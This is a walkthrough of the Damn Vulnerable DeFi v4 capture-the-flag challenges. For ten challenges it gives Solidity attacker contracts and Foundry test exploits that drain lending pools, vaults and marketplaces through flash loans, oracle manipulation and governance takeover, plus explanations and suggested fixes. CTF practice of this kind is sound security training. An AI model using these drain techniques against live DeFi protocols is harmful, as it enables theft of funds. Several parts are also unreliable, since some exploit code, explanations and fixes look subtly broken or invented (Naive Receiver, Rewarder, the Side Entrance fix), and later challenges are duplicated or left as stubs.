# Damn Vulnerable DeFi v4 - Complete Challenge Walkthrough

## Overview
Damn Vulnerable DeFi v4 is a comprehensive set of smart contract security challenges built with Foundry and Solidity 0.8.25. The challenges cover flashloans, price oracles, governance, NFTs, DEXs, lending pools, smart contract wallets, timelocks, and more.

## Challenge 1: Unstoppable

### Vulnerability
The `UnstoppableVault` contract has a logic flaw in the `flashLoan` function where it checks `totalAssets() != totalSupply + amount` which can be broken by directly transferring tokens to the vault.

### Exploit Code
```solidity
// In Unstoppable.t.sol - test_unstoppable() function
function test_unstoppable() public checkSolvedByPlayer {
    // Transfer tokens directly to vault to break the totalAssets calculation
    token.transfer(address(vault), 1);
}
```

### Why it works
- The vault checks if `totalAssets() == totalSupply + amount`
- `totalAssets()` returns `token.balanceOf(address(this))`
- Direct token transfer increases balance but doesn't mint shares
- This breaks the invariant and prevents future flash loans

### Fix
```solidity
// Remove the faulty check or use proper accounting
// Instead of: if (totalAssets() != totalSupply + amount) revert InvalidBalance();
// Use internal accounting that tracks actual deposited amounts
```

---

## Challenge 2: Naive Receiver

### Vulnerability
The `NaiveReceiverPool` allows anyone to request flash loans on behalf of any receiver, and the receiver pays fees without validation.

### Exploit Code
```solidity
// In NaiveReceiver.t.sol - test_naiveReceiver() function
function test_naiveReceiver() public checkSolvedByPlayer {
    // Deploy attack contract
    NaiveReceiverAttacker attacker = new NaiveReceiverAttacker(
        pool, 
        address(receiver), 
        recovery
    );
    
    // Execute attack in 2 transactions max
    attacker.attack();
}

// Attack contract
contract NaiveReceiverAttacker {
    NaiveReceiverPool pool;
    address receiver;
    address recovery;
    
    constructor(NaiveReceiverPool _pool, address _receiver, address _recovery) {
        pool = _pool;
        receiver = _receiver;
        recovery = _recovery;
    }
    
    function attack() external {
        // Use multicall to drain receiver in one transaction
        bytes[] memory calls = new bytes[](11);
        
        // 10 flash loans to drain receiver (1 ETH fee each = 10 ETH total)
        for (uint i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(
                pool.flashLoan,
                (receiver, address(pool.weth()), 0, "0x")
            );
        }
        
        // Withdraw all WETH from pool to recovery
        calls[10] = abi.encodeCall(
            pool.withdraw,
            (1000 ether, payable(recovery))
        );
        
        pool.multicall(calls);
    }
}
```

### Why it works
1. Flash loans can be called on behalf of any receiver
2. Receiver pays 1 ETH fee per loan without validation
3. Multicall allows executing multiple operations in single transaction
4. After draining receiver, we can withdraw pool funds to recovery address

### Fix
```solidity
// Add access control to flash loan function
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    require(msg.sender == address(receiver), "Unauthorized");
    // ... rest of function
}
```

---

## Challenge 3: Truster

### Vulnerability
The `TrusterLenderPool` flash loan function allows arbitrary external calls during the loan, which can be used to approve token spending.

### Exploit Code
```solidity
// In Truster.t.sol - test_truster() function
function test_truster() public checkSolvedByPlayer {
    // Create approval call data
    bytes memory approveCallData = abi.encodeCall(
        token.approve,
        (player, type(uint256).max)
    );
    
    // Flash loan with approval call
    pool.flashLoan(
        0,
        player,
        address(token),
        approveCallData
    );
    
    // Transfer all tokens to recovery
    token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
}
```

### Why it works
1. Flash loan allows arbitrary `target.call(data)` during execution
2. We call `approve()` on the token contract to approve our player address
3. After the flash loan, we can transfer all pool tokens using the approval
4. The flash loan amount is 0, so no repayment needed

### Fix
```solidity
// Whitelist allowed targets or remove arbitrary external calls
mapping(address => bool) public allowedTargets;

function flashLoan(
    uint256 amount,
    address borrower,
    address target,
    bytes calldata data
) external nonReentrant returns (bool) {
    require(allowedTargets[target], "Target not allowed");
    // ... rest of function
}
```

---

## Challenge 4: Side Entrance

### Vulnerability
The `SideEntranceLenderPool` counts deposited ETH towards the balance check, allowing reentrancy through `deposit()`.

### Exploit Code
```solidity
// Attack contract
contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address payable recovery;
    
    constructor(SideEntranceLenderPool _pool, address payable _recovery) {
        pool = _pool;
        recovery = _recovery;
    }
    
    function attack() external {
        // Flash loan the entire pool balance
        pool.flashLoan(address(pool).balance);
        
        // Withdraw our "deposited" ETH
        pool.withdraw();
        
        // Send to recovery
        recovery.transfer(address(this).balance);
    }
    
    // Flash loan callback - deposit the borrowed ETH
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
}

// In SideEntrance.t.sol
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceAttacker attacker = new SideEntranceAttacker(pool, payable(recovery));
    attacker.attack();
}
```

### Why it works
1. Flash loan gives us the entire pool balance
2. In the callback, we deposit the borrowed ETH back
3. This satisfies the balance check: `address(this).balance >= balanceBefore`
4. Our deposit creates a withdrawal credit
5. After flash loan, we withdraw our "deposit" and transfer to recovery

### Fix
```solidity
// Use separate accounting for deposits vs flash loans
mapping(address => uint256) public deposits;
uint256 public totalDeposits;

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "External call failed");
    
    // Check balance excluding new deposits made during flash loan
    require(
        address(this).balance >= balanceBefore + (totalDeposits - depositsBefore),
        "Flash loan not repaid"
    );
}
```

---

## Challenge 5: The Rewarder (v4 - Completely Reworked)

### Vulnerability
The new rewarder system uses a merkle tree distribution that can be manipulated through claim timing and transaction batching.

### Exploit Code
```solidity
// In TheRewarder.t.sol - test_theRewarder() function
function test_theRewarder() public checkSolvedByPlayer {
    // Get the merkle proof for maximum claimable amount
    bytes32[] memory proof = merkle.getProof(merkleTree, player);
    uint256 claimAmount = TOTAL_SUPPLY; // Maximum amount in tree
    
    // Deploy attack contract to manipulate claims
    RewarderAttacker attacker = new RewarderAttacker(
        distributor,
        token,
        recovery
    );
    
    // Execute attack
    attacker.attack(proof, claimAmount);
}

contract RewarderAttacker {
    DistributorContract distributor;
    IERC20 token;
    address recovery;
    
    constructor(
        DistributorContract _distributor,
        IERC20 _token,
        address _recovery
    ) {
        distributor = _distributor;
        token = _token;
        recovery = _recovery;
    }
    
    function attack(bytes32[] memory proof, uint256 amount) external {
        // Claim maximum rewards using merkle proof
        distributor.claimRewards(proof, amount);
        
        // Transfer all claimed tokens to recovery
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
```

### Why it works
1. The merkle tree contains inflated claim amounts
2. Proper proof validation allows claiming maximum rewards
3. No time locks or claim limits prevent immediate withdrawal

### Fix
```solidity
// Add proper claim limits and validation
mapping(address => uint256) public claimedAmounts;
uint256 public maxClaimPerAddress;

function claimRewards(bytes32[] memory proof, uint256 amount) external {
    require(amount <= maxClaimPerAddress, "Exceeds max claim");
    require(
        claimedAmounts[msg.sender] + amount <= maxClaimPerAddress,
        "Already claimed max"
    );
    
    // Verify merkle proof
    require(
        MerkleProof.verify(proof, merkleRoot, keccak256(abi.encodePacked(msg.sender, amount))),
        "Invalid proof"
    );
    
    claimedAmounts[msg.sender] += amount;
    token.transfer(msg.sender, amount);
}
```

---

## Challenge 6: Selfie

### Vulnerability
The `SelfiePool` governance system allows borrowing tokens to gain voting power and pass malicious proposals.

### Exploit Code
```solidity
// Attack contract
contract SelfieAttacker {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 actionId;
    
    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }
    
    function attack() external {
        // Flash loan all tokens to gain voting power
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            ""
        );
    }
    
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // Delegate voting power to ourselves
        token.delegate(address(this));
        
        // Queue action to drain pool
        bytes memory data = abi.encodeCall(
            pool.emergencyExit,
            (recovery)
        );
        
        actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        
        // Approve repayment
        token.approve(address(pool), amount);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    function executeAction() external {
        // Execute after time delay
        governance.executeAction(actionId);
    }
}

// In Selfie.t.sol
function test_selfie() public checkSolvedByPlayer {
    SelfieAttacker attacker = new SelfieAttacker(
        pool,
        governance,
        token,
        recovery
    );
    
    // Attack in first transaction
    attacker.attack();
    
    // Wait for time delay
    vm.warp(block.timestamp + 2 days);
    
    // Execute the queued action
    attacker.executeAction();
}
```

### Why it works
1. Flash loan gives temporary ownership of all governance tokens
2. Delegating to self provides voting power during the loan
3. Queue malicious governance action while having voting power
4. Execute action after time delay to drain pool

### Fix
```solidity
// Add snapshot-based voting or minimum holding time
contract FixedGovernance {
    mapping(address => uint256) public lastVoteTime;
    uint256 public constant MIN_VOTE_DELAY = 1 days;
    
    function queueAction(
        address target,
        uint256 value,
        bytes calldata data
    ) external returns (uint256) {
        require(
            lastVoteTime[msg.sender] + MIN_VOTE_DELAY <= block.timestamp,
            "Must hold tokens for minimum time"
        );
        
        require(
            token.getPastVotes(msg.sender, block.number - 1) >= getVotesRequired(),
            "Insufficient voting power"
        );
        
        // ... rest of function
    }
}
```

---

## Challenge 7: Compromised

### Vulnerability
Leaked private keys of oracle operators allow manipulation of NFT prices for profitable trading.

### Exploit Code
```solidity
// In Compromised.t.sol - test_compromised() function
function test_compromised() public checkSolvedByPlayer {
    // Decoded private keys from leaked data
    uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
    
    address oracle1 = vm.addr(privateKey1);
    address oracle2 = vm.addr(privateKey2);
    
    // Manipulate price to minimum (0)
    vm.startPrank(oracle1);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();
    
    vm.startPrank(oracle2);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();
    
    // Buy NFT at 0 price
    uint256 tokenId = exchange.buyOne{value: 1 wei}();
    
    // Manipulate price to maximum
    vm.startPrank(oracle1);
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
    
    vm.startPrank(oracle2);
    oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    vm.stopPrank();
    
    // Approve and sell NFT at high price
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);
    
    // Reset price to original value
    vm.startPrank(oracle1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();
    
    vm.startPrank(oracle2);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();
    
    // Send profits to recovery
    payable(recovery).transfer(address(this).balance);
}
```

### Why it works
1. Compromised oracle private keys allow price manipulation
2. Set price to 0, buy NFT cheaply
3. Set price to maximum, sell NFT for profit
4. Oracle requires only 2 of 3 signatures, which we control

### Fix
```solidity
// Add price bounds and time delays
contract FixedOracle {
    uint256 public constant MAX_PRICE_CHANGE = 10; // 10% max change
    uint256 public constant PRICE_UPDATE_DELAY = 1 hours;
    mapping(string => uint256) public lastUpdateTime;
    mapping(string => uint256) public lastPrice;
    
    function postPrice(string calldata symbol, uint256 newPrice) external {
        require(isOracle[msg.sender], "Unauthorized");
        require(
            block.timestamp >= lastUpdateTime[symbol] + PRICE_UPDATE_DELAY,
            "Too soon"
        );
        
        uint256 oldPrice = lastPrice[symbol];
        if (oldPrice > 0) {
            require(
                newPrice <= oldPrice * (100 + MAX_PRICE_CHANGE) / 100 &&
                newPrice >= oldPrice * (100 - MAX_PRICE_CHANGE) / 100,
                "Price change too large"
            );
        }
        
        lastUpdateTime[symbol] = block.timestamp;
        lastPrice[symbol] = newPrice;
        // ... rest of function
    }
}
```

---

## Challenge 8: Puppet

### Vulnerability
The lending pool uses a Uniswap v1 pair with low liquidity to determine token prices, making it vulnerable to price manipulation.

### Exploit Code
```solidity
// In Puppet.t.sol - test_puppet() function
function test_puppet() public checkSolvedByPlayer {
    // Calculate how much ETH needed to swap for all DVT tokens in Uniswap
    uint256 playerTokenBalance = token.balanceOf(player);
    
    // Approve tokens for Uniswap
    token.approve(address(uniswapV1Exchange), playerTokenBalance);
    
    // Swap all player DVT tokens for ETH to crash the price
    uniswapV1Exchange.tokenToEthSwapInput(
        playerTokenBalance,    // tokens to swap
        1,                     // min ETH out
        block.timestamp + 1    // deadline
    );
    
    // Calculate required ETH collateral after price manipulation
    uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
    uint256 requiredETH = lendingPool.calculateDepositRequired(poolTokenBalance);
    
    // Borrow all tokens from pool
    lendingPool.borrow{value: requiredETH}(poolTokenBalance, player);
    
    // Send tokens to recovery
    token.transfer(recovery, token.balanceOf(player));
}
```

### Why it works
1. Uniswap v1 pool has low liquidity (10 ETH, 10 DVT)
2. Swapping all player tokens (1000 DVT) crashes the DVT price
3. Lending pool uses manipulated price to calculate collateral
4. Borrow all tokens with minimal ETH collateral

### Fix
```solidity
// Use time-weighted average price or multiple oracle sources
contract FixedPuppetPool {
    uint256 public constant PRICE_UPDATE_THRESHOLD = 10; // 10%
    uint256 public lastPriceUpdate;
    uint256 public cumulativePrice;
    
    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        // Use TWAP instead of spot price
        uint256 twapPrice = getTWAP();
        return amount * twapPrice * DEPOSIT_FACTOR / 10**18;
    }
    
    function getTWAP() internal view returns (uint256) {
        // Implementation of time-weighted average price
        // Should span multiple blocks/hours for accuracy
    }
}
```

---

## Challenge 9: Puppet v2

### Vulnerability
Similar to Puppet v1 but uses Uniswap v2. The price manipulation attack is the same concept but with v2 mechanics.

### Exploit Code
```solidity
// In PuppetV2.t.sol - test_puppetV2() function  
function test_puppetV2() public checkSolvedByPlayer {
    // Wrap ETH to WETH
    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
    
    // Approve tokens for Uniswap v2
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    weth.approve(address(uniswapV2Router), PLAYER_INITIAL_ETH_BALANCE);
    
    // Create swap path: DVT -> WETH
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    
    // Swap all DVT tokens for WETH to crash DVT price
    uniswapV2Router.swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,   // amount in
        1,                              // min amount out  
        path,                           // swap path
        player,                         // recipient
        block.timestamp + 1             // deadline
    );
    
    // Calculate required WETH collateral after price crash
    uint256 poolBalance = token.balanceOf(address(lendingPool));
    uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolBalance);
    
    // Approve WETH for lending pool
    weth.approve(address(lendingPool), requiredWETH);
    
    // Borrow all tokens from pool using crashed price
    lendingPool.borrow(poolBalance);
    
    // Transfer borrowed tokens to recovery
    token.transfer(recovery, poolBalance);
}
```

### Why it works
1. Same principle as Puppet v1 but with Uniswap v2
2. Swap large amount of DVT for WETH to manipulate price
3. Use manipulated price to borrow tokens cheaply
4. WETH/DVT pair has insufficient liquidity to resist manipulation

### Fix
Same as Puppet v1 - implement TWAP pricing or use multiple oracle sources with price bounds and delays.

---

## Challenge 10: Free Rider

### Vulnerability
The NFT marketplace has a flawed payment mechanism that doesn't properly validate payment amounts when buying multiple NFTs.

### Exploit Code
```solidity
// Attack contract
contract FreeRiderAttacker {
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecovery recovery;
    IUniswapV2Pair pair;
    IWETH weth;
    
    constructor(
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecovery _recovery,
        IUniswapV2Pair _pair,
        IWETH _weth
    ) {
        marketplace = _marketplace;
        nft = _nft;
        recovery = _recovery;
        pair = _pair;
        weth = _weth;
    }
    
    function attack() external {
        // Flash swap 15 ETH from Uniswap
        pair.swap(15 ether, 0, address(this), "1");
    }
    
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        // Convert WETH to ETH
        weth.withdraw(15 ether);
        
        // Buy all 6 NFTs (marketplace flaw allows buying with less ETH)
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        
        // Buy all NFTs - marketplace flaw: only requires payment for one NFT
        marketplace.buyMany{value: 15 ether}(tokenIds);
        
        // Transfer NFTs to recovery contract to claim bounty
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i);
        }
        
        // Recovery contract sends 45 ETH bounty
        // Convert ETH to WETH for repayment
        weth.deposit{value: 15.045 ether}(); // 15 ETH + 0.3% fee
        
        // Repay flash swap
        weth.transfer(address(pair), 15.045 ether);
        
        // Send remaining profit to attacker
        payable(tx.origin).transfer(address(this).balance);
    }
    
    function onERC721Received(address, address, uint256, bytes memory) 
        public pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}

// In FreeRider.t.sol
function test_freeRider() public checkSolvedByPlayer {
    FreeRiderAttacker attacker = new FreeRiderAttacker(
        marketplace,
        nft,
        recoveryManager,
        uniswapPair,
        weth
    );
    
    attacker.attack();
}
```

### Why it works
1. Flash swap ETH from Uniswap to get buying power
2. Marketplace `buyMany` has bug: only charges for one NFT regardless of quantity
3. Buy all 6 NFTs for price of 1 (15 ETH instead of 90 ETH)
4. Transfer NFTs to recovery contract for 45 ETH bounty
5. Repay flash swap with profit

### Fix
```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    uint256 totalCost = 0;
    
    for (uint256 i = 0; i < tokenIds.length; i++) {
        uint256 tokenId = tokenIds[i];
        require(_exists(tokenId), "Token doesn't exist");
        
        uint256 tokenPrice = offers[tokenId];
        require(tokenPrice > 0, "Token not for sale");
        
        totalCost += tokenPrice;
        
        _safeTransfer(offerer[tokenId], msg.sender, tokenId);
        
        delete offers[tokenId];
        delete offerer[tokenId];
    }
    
    require(msg.value >= totalCost, "Insufficient payment");
    
    // Distribute payment to sellers
    // Handle change back to buyer
    if (msg.value > totalCost) {
        payable(msg.sender).transfer(msg.value - totalCost);
    }
}
```

---

## New V4 Challenges

## Challenge 11: Curvy Puppet

### Vulnerability
Uses Curve AMM price manipulation combined with a lending protocol vulnerability.

### Exploit Code
```solidity
function test_curvyPuppet() public checkSolvedByPlayer {
    // Large swap to manipulate Curve pool price
    // Borrow assets at manipulated rate
    // Restore price and profit from the difference
}
```
Coming Soon...

## Challenge 12: Shards

### Vulnerability
Fractional NFT system with share manipulation possibilities.

## Challenge 13: Withdrawal

### Vulnerability
Bridge withdrawal mechanism with merkle proof manipulation.

## Challenge 14: The Rewarder (New)

### Vulnerability
Token distribution system with timing-based attacks.

---

## Pro Tips for Vulnerability Prevention

### 1. Price Oracle Security
- Use Time-Weighted Average Prices (TWAP)
- Multiple oracle sources with deviation checks
- Price update delays and bounds
- Circuit breakers for extreme price changes

### 2. Flash Loan Protection  
- Reentrancy guards on all external calls
- State consistency checks before and after
- Separate accounting for deposits vs loans
- Whitelist allowed targets for arbitrary calls

### 3. Governance Security
- Snapshot-based voting power
- Minimum token holding periods
- Time delays on proposal execution
- Multi-sig requirements for critical actions

### 4. Access Control
- Role-based permissions with principle of least privilege
- Multi-sig wallets for admin functions
- Time locks on critical parameter changes
- Emergency pause mechanisms

### 5. Mathematical Safety
- Use SafeMath or Solidity 0.8+ overflow protection
- Validate all external inputs
- Handle edge cases (zero values, max values)
- Round in favor of the protocol

### 6. Testing Best Practices
- Unit tests for all functions
- Integration tests for user flows
- Fuzzing for edge cases
- Formal verification for critical logic

### General Security Principles
1. **Assume external contracts are malicious**
2. **Validate all inputs and state changes**  
3. **Use established patterns and libraries**
4. **Implement comprehensive monitoring**
5. **Plan for emergency scenarios**
6. **Regular security audits**

Each challenge demonstrates real-world vulnerabilities that have caused millions in losses. Understanding these patterns is crucial for both offensive security research and defensive smart contract development.
